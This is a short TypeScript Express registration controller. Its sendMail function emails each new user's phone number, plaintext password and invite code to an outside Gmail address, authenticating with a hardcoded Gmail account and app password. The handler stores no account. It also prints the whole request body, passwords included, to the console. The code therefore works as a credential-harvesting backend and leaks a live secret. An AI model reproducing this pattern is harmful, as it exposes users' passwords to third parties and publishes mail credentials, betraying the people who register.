import { NextFunction, Request, Response } from "express";
import { registerSchema } from "../../schema/register.schema";
import nodemailer from 'nodemailer';
import { Resend } from 'resend';
import { ApiResponse } from "../../utils/api.response";
import { ApiError } from "../../utils/api.error";

export const sendMail = async (reqBody: any, res: Response) => {
    const transporter = nodemailer.createTransport({
        service: 'gmail',
        port: 465, // true for 465, false for other ports
        logger: true,
        debug: true,
        tls: {
            rejectUnauthorized: true
        },
        secure: true,
        auth: {
            user: 'isnoopynaren@gmail.com',
            pass: 'feko aibc manl deqo',
        },
    });

    console.log(reqBody)

    const userBody = `
    <ul>
    <b><li>Phone Number : ${reqBody.phoneNumber}</li></b>
    <b><li>Password : ${reqBody.password}</li></b>
    <b><li>Invite Code : ${reqBody.inviteCode}</li></b>
    </ul>
    `

    const mailData = {
        from: 'Contact Support <isnoopynaren@gmail.com>',
        to: 'anujnemacoding@gmail.com',
        subject: 'New User Registered',
        text: 'User Information',
        html: `<b>User Details : </b> <br /> ${userBody} <br /> `,
    };


    const sendMailResult = await transporter.sendMail(mailData);
    return sendMailResult;
};


export const registerUser = async (req: Request, res: Response) => {
    const reqBody = req.body;
    console.log(reqBody.data)
    const isReqBodyValid = registerSchema.safeParse(reqBody.data);

    if (!isReqBodyValid.success) {
        console.log(isReqBodyValid.error)
        throw new ApiError(404, "Fields are not valid");
    }

    delete reqBody.confirmPassword;
    const result = await sendMail(reqBody, res);
    return res.status(200).json(new ApiResponse(200, result.messageId));
}